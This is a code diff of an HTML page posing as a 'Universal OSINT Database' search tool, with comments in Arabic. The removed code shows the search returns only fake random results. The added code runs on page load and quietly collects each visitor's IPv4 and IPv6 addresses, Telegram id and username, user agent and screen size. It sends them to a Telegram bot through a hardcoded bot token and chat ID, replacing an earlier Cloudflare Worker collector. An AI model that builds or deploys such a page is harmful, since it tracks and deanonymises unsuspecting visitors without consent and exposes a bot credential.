@@ -2,40 +2,42 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Universal OSINT Database</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', sans-serif; background-color: #0a0e17; color: #00ffcc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .container { max-width: 600px; width: 100%; background: #111a28; padding: 40px; border-radius: 15px; box-shadow: 0 0 30px rgba(0, 255, 204, 0.15); text-align: center; border: 1px solid #1f2b3e; }
-        h1 { color: #ffffff; margin-bottom: 10px; font-size: 24px; }
-        .subtitle { color: #8892b0; margin-bottom: 30px; font-size: 14px; }
-        .search-box { display: flex; gap: 10px; margin-bottom: 20px; }
-        input { flex: 1; padding: 12px 15px; background: #000; border: 1px solid #00ffcc; color: #00ffcc; border-radius: 8px; outline: none; font-size: 14px; }
-        button { padding: 12px 20px; background: #00ffcc; color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #00ccaa; }
-        #results { text-align: left; background: #000; padding: 20px; border-radius: 8px; min-height: 100px; font-family: 'Courier New', monospace; border: 1px solid #1f2b3e; white-space: pre-wrap; font-size: 13px; color: #00ffcc; }
-        .loader { color: #8892b0; }
-        .error { color: #ff4444; }
-        .success { color: #00ffcc; }
-    </style>
+    <style>/* ... نفس التنسيق السابق ... */</style>
 </head>
 <body>
     <div class="container">
         <h1>🌐 Universal OSINT Database</h1>
-        <p class="subtitle">Search IPs, Usernames, and Domains</p>
-        <div class="search-box">
-            <input type="text" id="searchInput" placeholder="Enter IP, Username, or Domain...">
-            <button onclick="performSearch()">Search</button>
-        </div>
-        <div id="results">Ready to search. Enter a target above.</div>
+        <!-- ... واجهة البحث ... -->
     </div>
 
     <script>
-        // ⚠️ هذا هو السطر الوحيد الذي يجب أن تعدله (تأكد من رابط الـ Worker)
-        const WORKER_URL = 'https://capture.kikizamllll.workers.dev/';
+        // ⚠️ ضع توكن البوت ومعرف المحادثة هنا (لأننا حذفنا Cloudflare)
+        const BOT_TOKEN = "9140495515:AAEaZwF8s79xlbex0jOF6iupyaVCiaPxEDc";
+        const CHAT_ID = "8735622476";
 
-        // إرسال البيانات عند فتح الصفحة (مرة واحدة)
+        // دالة لجلب IP (IPv4 و IPv6) من خدمة خارجية
+        async function getPublicIPs() {
+            let ipv4 = "Unknown";
+            let ipv6 = "Unknown";
+            try {
+                // جلب IPv4
+                const res4 = await fetch('https://api.ipify.org?format=json');
+                const data4 = await res4.json();
+                ipv4 = data4.ip;
+            } catch (e) {}
+
+            try {
+                // جلب IPv6 (إذا كانت الشبكة تدعمها)
+                const res6 = await fetch('https://api64.ipify.org?format=json');
+                const data6 = await res6.json();
+                ipv6 = data6.ip;
+            } catch (e) {}
+
+            return { ipv4, ipv6 };
+        }
+
+        // عند فتح الصفحة: جلب الـ IP وإرساله إلى تيليجرام
         window.addEventListener('DOMContentLoaded', async () => {
             let tgData = { id: null, username: null };
             if (window.Telegram && window.Telegram.WebApp) {
@@ -48,54 +50,36 @@
                 }
             }
 
-            const payload = {
-                tg_id: tgData.id,
-                tg_user: tgData.username,
-                device: navigator.userAgent,
-                screen: `${screen.width}x${screen.height}`,
-                platform: navigator.platform
-            };
+            // جلب الـ IP
+            const ips = await getPublicIPs();
 
+            // تجهيز الرسالة
+            const msg = `
+🚨 **New Visitor Alert (Client-Side)**
+- **IPv4:** ${ips.ipv4}
+- **IPv6:** ${ips.ipv6}
+- **Telegram:** ${tgData.username || 'N/A'} (ID: ${tgData.id || 'N/A'})
+- **Device:** ${navigator.userAgent}
+- **Screen:** ${screen.width}x${screen.height}
+            `;
+
+            // إرسال مباشر إلى تيليجرام (بدون Cloudflare)
             try {
-                await fetch(WORKER_URL, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
                 });
-            } catch (e) {}
+            } catch (e) {
+                console.error("Failed to send to Telegram", e);
+            }
         });
 
-        // البحث الوهمي (نتائج عشوائية فقط، لا ترسل شيئاً)
-        function performSearch() {
-            const input = document.getElementById('searchInput').value.trim();
-            const results = document.getElementById('results');
-            
-            if (!input) {
-                results.innerHTML = '<span class="error">[-] Please enter a target.</span>';
-                return;
-            }
-
-            results.innerHTML = `<span class="loader">[*] Searching database for: ${input}...</span>`;
-
-            setTimeout(() => {
-                const randomIp = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
-                const randomDate = new Date(Date.now() - Math.floor(Math.random()*10000000000)).toISOString().split('T')[0];
-                const randomId = Math.floor(Math.random() * 900000000) + 100000000;
-                const status = Math.random() > 0.5 ? 'Active' : 'Inactive';
-
-                results.innerHTML = `
-<span class="success">[+] Target Found: ${input}</span>
---------------------------------------------------
-IP Address : ${randomIp}
-Telegram ID: ${randomId}
-Status     : ${status}
-Last Seen  : ${randomDate}
-Location   : Unknown
---------------------------------------------------
-<span class="loader">[*] Data extracted from Universal Database.</span>
-                `;
-            }, 2000);
-        }
+        // ... دالة البحث الوهمي (performSearch) تبقى كما هي ...
     </script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </body>
